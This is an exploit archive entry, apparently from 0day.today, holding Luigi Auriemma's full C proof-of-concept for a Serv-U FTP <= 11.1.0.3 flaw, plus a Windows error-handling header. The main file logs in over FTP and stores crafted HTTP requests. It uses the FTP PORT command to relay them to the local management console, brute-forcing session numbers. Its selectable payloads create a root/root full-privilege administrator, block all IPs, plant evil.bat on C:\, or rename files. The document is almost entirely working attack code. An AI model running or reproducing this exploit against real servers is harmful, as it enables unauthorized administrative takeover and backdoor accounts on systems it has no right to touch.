@@ -1,0 +1,651 @@
+id: 18886
+date: 07/01/2012
+title: Serv-U FTP <= 11.1.0.3 possible management console access
+author: Luigi Auriemma
+cves: 
+
+--------
+
+winerr.h
+
+--------
+
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+
+----------
+servu_1b.c
+----------
+
+/*
+  by Luigi Auriemma
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <ctype.h>
+#include <time.h>
+#include <inttypes.h>
+
+#ifdef WIN32
+    #include <winsock.h>
+    #include "winerr.h"
+
+    #define close   closesocket
+    #define sleep   Sleep
+    #define ONESEC  1000
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+
+    #define ONESEC  1
+    #define strnicmp    strncasecmp
+    #define strnistr    strncasestr
+#endif
+
+#ifdef WIN32
+    #define quick_thread(NAME, ARG) DWORD WINAPI NAME(ARG)
+    #define thread_id   HANDLE
+#else
+    #define quick_thread(NAME, ARG) void *NAME(ARG)
+    #define thread_id   pthread_t
+#endif
+
+thread_id quick_threadx(void *func, void *data) {
+    thread_id   tid;
+#ifdef WIN32
+    DWORD   tmp;
+
+    tid = CreateThread(NULL, 0, func, data, 0, &tmp);
+    if(!tid) return(0);
+#else
+    if(pthread_create(&tid, NULL, func, data)) return(0);
+#endif
+    return(tid);
+}
+
+void quick_threadz(thread_id tid) {
+#ifdef WIN32
+    DWORD   ret;
+
+    for(;;) {
+        if(!GetExitCodeThread(tid, &ret)) break;
+        if(!ret) break;
+        Sleep(100);
+    }
+#else
+    pthread_join(tid, NULL);
+#endif
+}
+
+typedef uint8_t     u8;
+typedef uint16_t    u16;
+typedef uint32_t    u32;
+
+
+
+#define VER         "0.1"
+#define PORT        21
+#define BUFFSZ      4096
+#define ADMIN_PORT  43958
+
+
+
+typedef struct {
+    struct sockaddr_in  peer;
+    int         sd;
+    int         n;
+    long long   start;
+    long long   session;
+    long long   end;
+    thread_id   tid;
+    int         done;
+} args_t;
+
+
+
+quick_thread(servu_scan, args_t *args);
+int delimit(u8 *data);
+int conna(struct sockaddr_in *peer);
+int get_ftp_port(u8 *buff, u32 *ip);
+int recv_ftp(int sd, u8 **rbuff);
+int send_ftp(int sd, u8 *cmd, u8 *arg);
+int timeout(int sock, int secs);
+u32 resolv(char *host);
+void std_err(void);
+
+
+
+static int  debug   = 0,
+            exploit = 4;
+
+
+
+int main(int argc, char *argv[]) {
+    struct  sockaddr_in peer;
+    long long   session;
+    args_t  *args;
+    int     sd,
+            i,
+            n,
+            res     = -1;
+    u16     port    = PORT;
+    u8      *host,
+            *user,
+            *pass,
+            *sess,
+            *p,
+            *l;
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    fputs("\n"
+        "Serv-U FTP <= 11.1.0.3 possible management console access " VER "\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    aluigi.org\n"
+        "\n", stdout);
+
+    if(argc < 5) {
+        printf("\n"
+            "Usage: %s [-d/e] <session_start> <username> <password> <host> [port(%d)]\n"
+            "\n"
+            "- this proof-of-concept demonstrates the vulnerability by creating the user\n"
+            "  root with password root having full access and privileges, watch the source\n"
+            "  code and choose the other examples using the -e option\n"
+            "- your user MUST have write privileges to exploit the vulnerability\n"
+            "- session_start is the value from which starting the scanning, for example\n"
+            "  9000 if both the server and the management console have been just started,\n"
+            "  you can also specify multiple starts like 8000,9000,10000,11000 and the\n"
+            "  tool will scan them in multi-threading increasing the speed\n"
+            "- successfully tested with Windows XP and 2003 Server\n"
+            "- it's not clear if Windows 7/2008 is vulnerable, Linux not tested\n"
+            "\n"
+            "Example: servu_1b 9000,12000,14000 myuser mypass example.com\n"
+            "\n", argv[0], port);
+        exit(1);
+    }
+
+    // just for my tests
+    for(i = 1; i < argc; i++) {
+        if(argv[i][0] != '-') break;
+        if(!strcmp(argv[i], "-d")) {
+            debug   = 1;
+        } else if(!strcmp(argv[i], "-e")) {
+            i++;
+            exploit = atoi(argv[i]);
+        }
+    }
+
+    sess = argv[i];
+    user = argv[i + 1];
+    pass = argv[i + 2];
+    host = argv[i + 3];
+    if((i + 4) < argc) port = atoi(argv[i + 4]);
+
+    peer.sin_addr.s_addr = resolv(host);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+
+    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
+
+    printf(
+        "- create a file containing the commands to send to the server\n"
+        "- it must have the correct Session number so let's go with the scan\n");
+
+    n = 0;
+    for(i = 0; sess[i]; i++) {
+        if(sess[i] == ',') n++;
+    }
+    n++;
+    args = calloc(sizeof(args_t), n + 1);
+    if(!args) std_err();
+
+    p = sess;
+    for(i = 0; *p; i++) {
+        l = strchr(p, ',');
+        if(l) *l = 0;
+        session = atol(p);
+
+        sd = conna(&peer);
+
+        if(recv_ftp(sd, &p) < 0) goto quit;
+
+        if(send_ftp(sd, "USER", user) < 0) goto quit;
+        if(recv_ftp(sd, &p) < 0) goto quit;
+
+        if(send_ftp(sd, "PASS", pass) < 0) goto quit;
+        if(recv_ftp(sd, &p) < 0) goto quit;
+
+        memcpy(&args[i].peer, &peer, sizeof(struct sockaddr_in));
+        args[i].sd    = sd;
+        args[i].n     = i;
+        args[i].start = session;
+        args[i].end   = -1;
+        args[i].tid   = quick_threadx(servu_scan, &args[i]);
+
+        if(!l) break;
+        p = l + 1;
+    }
+
+    for(i = 0; args[i].tid; i++) {
+        if(i) args[i - 1].end = args[i].start;
+    }
+
+    printf("\n- Current Session:\n");
+
+    for(;;) {
+        n = 0;
+        for(i = 0; args[i].tid; i++) {
+            if(args[i].done) n++;
+        }
+        if(n >= i) break;
+
+        printf("\r");
+        for(i = 0; args[i].tid; i++) {
+            printf("  %-14"PRIu64"", args[i].session);
+            if(debug) printf("\n");
+        }
+        sleep(ONESEC);
+    }
+    //for(i = 0; args[i].tid; i++) {
+        //quick_threadz(args[i].tid);
+    //}
+
+    res = 0;
+
+quit:
+    //close(sd);
+    if(res < 0) {
+        printf("\nError: something wrong in the protocol or the connection\n");
+    } else {
+        printf("\n- done\n");
+    }
+    return(0);
+}
+
+
+
+quick_thread(servu_scan, args_t *args) {
+    struct  sockaddr_in peer;
+    long long   session;
+    int     sd,
+            s,
+            len,
+            hlen,
+            ret,
+            delperm = 1,
+            res     = -1;
+    u8      fname[64],
+            http[1024],
+            *buff,
+            *p;
+
+    sd = args->sd;
+
+    buff = malloc(BUFFSZ + 1);
+    if(!buff) std_err();
+
+    if(send_ftp(sd, "TYPE", "I") < 0) goto quit;
+    ret = recv_ftp(sd, &p);
+    if(ret < 0) goto quit;
+    if((ret / 100) != 2) goto quit;
+
+    for(session = args->start;; session++) {
+        if((args->end > 0) && (session >= args->end)) break;
+        if(debug) printf("\n%"PRIu64"\n\n", session);
+
+        args->session = session;
+        //printf("\n- check Session %"PRIu64"\n\n", session);
+        sprintf(fname, "bug%u.txt", (int)(time(NULL) + session));
+
+        if(send_ftp(sd, "PASV", "") < 0) goto quit;
+        ret = recv_ftp(sd, &p);
+        if(ret < 0) goto quit;
+        if((ret / 100) != 2) goto quit;
+
+        memcpy(&peer, &args->peer, sizeof(struct sockaddr_in));
+        peer.sin_port = htons(get_ftp_port(p, NULL));
+
+        if(send_ftp(sd, "STOR", fname) < 0) goto quit;
+        // receives the 1xx response for the ok
+
+        /*
+        UPLOAD HTTP REQUEST
+        */
+
+        hlen = 0;
+        len  = 0;
+        if(exploit == 1) {
+            // 1: deny *.*.*.*
+            len = sprintf(buff,
+                "IP=*.*.*.*&Allow=0");
+
+        } else if(exploit == 2) {
+            // 2: upload an evil file: c:\evil.bat
+            len = sprintf(buff,
+                "-----------------------------1234567890\r\n"
+                "Content-Disposition: form-data; name='File'; filename='evil.bat'\r\n"  // filename is ignored
+                "Content-Type: application/octet-stream\r\n"
+                "\r\n"
+                "notepad.exe\r\n"
+                "-----------------------------1234567890--\r\n");
+
+        } else if(exploit == 3) {
+            // 3: move a file from a location to another: c:\old.txt -> c:\evil.bat
+            // fast but you need to know the full real path of your folder
+            len = sprintf(buff,
+                "new_path=/C:/evil.bat&original_path=/C:/old.txt");
+
+        } else if(exploit == 4) {
+            // 4: root user
+            len = sprintf(buff, // Access=7967
+                "LoginID=root&Password=root&HomeDir=/&LockInHomeDir=0&Access=8191&EmailAddress=&FullName=&RequirePasswordChange=0&AlwaysAllowLogin=1&ComboAdminType=System%%20Administrator&AdminType=2&");
+
+        } else {
+            printf("\nError: invalid test number (%d)\n", exploit);
+            exit(1);
+        }
+
+        if(exploit == 1) {
+            hlen = sprintf(http,
+                "POST /Admin/XML/Result.xml?Session=%"PRIu64"&Command=AddObject&Object=CServer.0.IPAccess HTTP/1.1\r\n",
+                session);
+
+        } else if(exploit == 2) {
+            hlen = sprintf(http,
+                "POST /?Session=%"PRIu64"&Command=Upload&Dir=/C:/&TransferID=2&File=evil.bat HTTP/1.1\r\n"
+                "Content-Type: multipart/form-data; boundary=---------------------------1234567890\r\n",
+                session);
+
+        } else if(exploit == 3) {
+            hlen = sprintf(http,
+                "POST /?Session=%"PRIu64"&Command=Rename&Dir=/C: HTTP/1.1\r\n",
+                session);
+
+        } else if(exploit == 4) {
+            hlen = sprintf(http,
+                "POST /Admin/XML/Result.xml?Session=%"PRIu64"&Command=ObjectCommand&Object=COrganization.241.CreateUser HTTP/1.1\r\n",
+                session);
+        }
+        hlen += sprintf(http + hlen,
+            //"Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n"
+            "Host: 127.0.0.1:43958\r\n"
+            "Content-Length: %d\r\n"
+            "\r\n",
+            len);
+
+        s = conna(&peer);
+        send(s, http, hlen, 0);
+        send(s, buff, len,  0);
+        close(s);
+
+        for(;;) {
+            ret = recv_ftp(sd, &p);
+            if(ret < 0) goto quit;
+            if((ret / 100) == 1) continue;
+            if((ret / 100) != 2) goto quit;
+            break;
+        }
+
+        sprintf(buff,
+            "%d,%d,%d,%d,%d,%d",
+            127, 0, 0, 1,
+            (ADMIN_PORT >> 8) & 0xff, ADMIN_PORT & 0xff);
+        if(send_ftp(sd, "PORT", buff) < 0) goto quit;
+
+        //sprintf(buff, "|2|::1|%d|", ADMIN_PORT);
+        //if(send_ftp(sd, "EPRT", ) < 0) goto quit;
+
+        ret = recv_ftp(sd, &p);
+        if(ret < 0) goto quit;
+        if((ret / 100) != 2) goto quit;
+
+        if(send_ftp(sd, "RETR", fname) < 0) goto quit;
+        for(;;) {
+            ret = recv_ftp(sd, &p);
+            if(ret < 0) goto quit;
+            if((ret / 100) == 1) continue;
+            if(ret == 425) {
+                printf("\n"
+                    "Error: seems that the server isn't vulnerable:\n"
+                    "       %s\n"
+                    "\n",
+                    p);
+                goto quit;
+            }
+            //if((ret / 100) != 2) goto quit;
+            // ignore errors and continue
+            break;
+        }
+
+        if(delperm) {
+            if(send_ftp(sd, "DELE", fname) < 0) goto quit;
+            ret = recv_ftp(sd, &p);
+            if(ret < 0) goto quit;
+            if((ret / 100) != 2) delperm = 0;   //goto quit;    // don't check it because it's not important
+        }
+    }
+    res = 0;
+    quit:
+    if(res < 0) printf("\nError: something wrong in the communication with the server\n");
+    close(sd);
+    args->done = 1;
+    return(res);
+}
+
+
+
+int delimit(u8 *data) {
+    u8      *p;
+
+    for(p = data; *p && (*p != '\r') && (*p != '\n'); p++);
+    *p = 0;
+    return(p - data);
+}
+
+
+
+int conna(struct sockaddr_in *peer) {
+    struct  linger  ling = {1,1};
+    int     sd;
+
+    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if(sd < 0) std_err();
+    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
+    if(connect(sd, (struct sockaddr *)peer, sizeof(struct sockaddr_in)) < 0) std_err();
+    return(sd);
+}
+
+
+
+int get_ftp_port(u8 *buff, u32 *ipx) {
+    u32     ip;
+    int     n1, n2, n3, n4, n5, n6,
+            port;
+    u8      *p;
+
+    p = strrchr(buff, '(');
+    if(!p) return(-1);
+    if(sscanf(p + 1, "%d,%d,%d,%d,%d,%d", &n1, &n2, &n3, &n4, &n5, &n6) != 6) return(-1);
+    ip = htonl((n1 << 24) | (n2 << 16) | (n3 << 8) | (n4));
+    if((ip == INADDR_ANY) || (ip == INADDR_NONE)) {
+        if(ipx) ip = *ipx;
+    }
+    if(ipx) *ipx = ip;
+    port = (n5 << 8) | (n6);
+    return(port);
+}
+
+
+
+int recv_ftp(int sd, u8 **rbuff) {
+    static int  buffsz  = 0;
+    static u8   *buff   = NULL;
+    int     i,
+            n,
+            ret;
+
+    do {
+        for(i = 0;; i++) {
+            if(i >= buffsz) {
+                buffsz += 1024;
+                buff = realloc(buff, buffsz + 1);
+                if(!buff) std_err();
+            }
+            if(timeout(sd, 5) < 0) return(-1);
+            if(recv(sd, buff + i, 1, 0) <= 0) return(-1);
+            if(buff[i] == '\n') break;
+        }
+        buff[i] = 0;
+        delimit(buff);
+        if(debug) printf("  %s\n", buff);
+        if(sscanf(buff, "%d%n", &ret, &n) != 1) return(-1);
+    } while(buff[n] == '-');
+    if(rbuff) *rbuff = buff;
+    return(ret);
+}
+
+
+
+int send_ftp(int sd, u8 *cmd, u8 *arg) {
+    static int  buffsz  = 0;
+    static u8   *buff = NULL;
+    int     len;
+
+    if(!arg) arg = "";
+    len = strlen(cmd) + 1 + strlen(arg) + 2;
+    if(len >= buffsz) {
+        buffsz = len + 256;
+        buff = realloc(buff, buffsz + 1);
+        if(!buff) std_err();
+    }
+    len = sprintf(buff, "%s %s\r\n", cmd, arg);
+    if(debug) printf("- %s", buff);
+    if(send(sd, buff, len, 0) <= 0) return(-1);
+    return(len);
+}
+
+
+
+int timeout(int sock, int secs) {
+    struct  timeval tout;
+    fd_set  fd_read;
+
+    tout.tv_sec  = secs;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
+      <= 0) return(-1);
+    return(0);
+}
+
+
+
+u32 resolv(char *host) {
+    struct  hostent *hp;
+    u32     host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u32 *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+
+
+
+#  0day.today [2023-03-23]  #
